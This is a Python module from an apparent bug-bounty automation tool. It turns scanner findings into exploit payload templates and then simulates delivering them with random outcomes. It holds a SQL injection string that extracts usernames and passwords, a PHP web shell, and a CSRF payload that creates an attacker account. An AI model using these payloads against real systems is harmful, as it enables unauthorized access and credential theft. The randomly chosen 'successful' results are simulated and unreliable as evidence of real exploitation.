# src/bountybot/exploits/payload_builder.py

import time
from random import choices

from bountybot.data.model import log_attack_result

def generate_for_vulnerability_chain(chain, findings):
    """
    Given an attack chain and all findings, propose plausible exploit attempts.
    """
    # Accumulate payload candidates matched to the inferred chain context.
    exploit_details = []

    names = [findings[idx]["info"]["name"] for idx in chain["steps"]]
    types = [findings[idx].get("__arcanum_type", '') for idx in chain["steps"]]
    roles = [findings[idx].get("__arcanum_role", '') for idx in chain["steps"]]

    # Basic heuristic cases: add more patterns to expand coverage.
    if 'SQL Injection' in names:
        exploit_details.append({
            "type": "sqli",
            "description": "Basic UNION-based query to extract usernames",
            "payload": "' UNION SELECT username,password FROM users--"
        })

    elif ('File Upload' in roles or 'Debug/Logging' in roles) and 'Login/Auth Endpoint' in roles:
        exploit_details.append({
            "type": "shell_upload",
            "description": "Attempt to upload PHP web shell to exposed directory",
            "payload": "<?php system($_GET['cmd']); ?>"
        })

    elif any(role in ('Admin Panel', 'Exposed Admin Panel') for role in roles):
        exploit_details.append({
            "type": "csrf_bypass",
            "description": "Generate CSRF PoC targeting user creation POST",
            "payload": "<img src=\"https://vuln.admin/api/users\" onload='fetch(\"create?user=attacker\", {method:\"POST\"})'>"
        })

    return exploit_details


def evaluate_attack_simulation(payload_details):
    """
    Mock decision engine that categorizes a simulated payload delivery.
    """
    # Randomized outcome selection simulates network/system uncertainty.
    possible_outcomes = ['denied', 'accepted', 'redirected', 'timeout']
    weights = [0.2, 0.5, 0.2, 0.1]

    fake_response_status = choices(possible_outcomes, weights)[0]
    time.sleep(0.1)  # Simulate short network delay

    description = payload_details.get('description', 'Unknown payload')
    return {
        "outcome": fake_response_status,
        "log_entry": f"[SIMULATION] {description}: Response State: {fake_response_status}"
    }


def simulate_attack_attempt(payloads, target_url):
    """
    Run a lightweight simulation for each payload+chain pair and log decisions.
    """
    simulation_results = []

    for payload_entry in payloads:
        # Payloads can be tuples (payload, chain) or payload-only.
        if isinstance(payload_entry, tuple) and len(payload_entry) == 2:
            pl_details, chain = payload_entry
        else:
            pl_details = payload_entry
            chain = {"name": target_url}

        sim_eval = evaluate_attack_simulation(pl_details)
        print(sim_eval['log_entry'])

        if sim_eval['outcome'] == 'accepted':
            # Persist "wins" so history can be surfaced to the analyst.
            log_attack_result(
                chain.get("name", "unknown"),
                "successful_simulation",
                ["tested", pl_details.get('type', 'unknown')],
            )

        simulation_results.append({
            "chain": chain,
            "payload": pl_details,
            "outcome": sim_eval["outcome"],
            "log_entry": sim_eval["log_entry"],
        })

    return simulation_results


# Export
__all__ = ['generate_for_vulnerability_chain', 'simulate_attack_attempt']
